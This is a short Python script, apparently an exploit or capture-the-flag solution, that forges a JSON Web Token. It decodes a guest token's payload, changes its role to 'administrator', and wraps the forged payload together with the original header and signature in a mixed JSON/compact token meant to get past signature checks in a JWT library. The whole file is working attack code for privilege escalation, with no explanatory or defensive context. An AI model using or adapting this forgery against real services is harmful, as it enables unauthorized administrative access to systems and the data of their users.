from jwcrypto.common import base64url_decode, base64url_encode
from json import loads, dumps

payload = "eyJleHAiOjE3MTAyNDY0ODksImlhdCI6MTcxMDI0Mjg4OSwianRpIjoidEVNd0ZjcDdPa1pYcmdwQ0p1ZlVsZyIsIm5iZiI6MTcxMDI0Mjg4OSwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ"
header = "eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9"
sign = "qHlZg42sqwrRYV7TpO_WajleY4sdpWrim3aYEECc82qd62GPUFfe9V9tW7ipGHVVg7Ay_OqE1uV1Q1_yse8pbLf2hjeotrkNb17NfLbS6-9soIyvlC6QlszjSBQCfenJn6WdwHdkH332huSnwJJ7WT5nDryE71ScPScQyKeZGGfoO5OqL1zF96nPKhIa77c2zW-g8ICkQi1jTxQhkqaRK6DG0cXHBqthRCUSI_rNSUIUKjef91p3_3d_HhUAJUOFfdfpeKIhqto96tss4Rldb_ZN2uISU87fZH0NMFUMOwEkZEOvwAWqndZ9vYvS3NQuTpqbot0vDNb_lPdfdf_GWg"

parsed_payload = loads(base64url_decode(payload))
parsed_payload['role'] = 'administrator'
fake_payload = base64url_encode((dumps(parsed_payload, separators=(',', ':'))))
new_payload = '{"  ' + header + '.' + fake_payload + '.":"","protected":"' + header + '", "payload":"' + payload + '","signature":"' + sign + '"}'
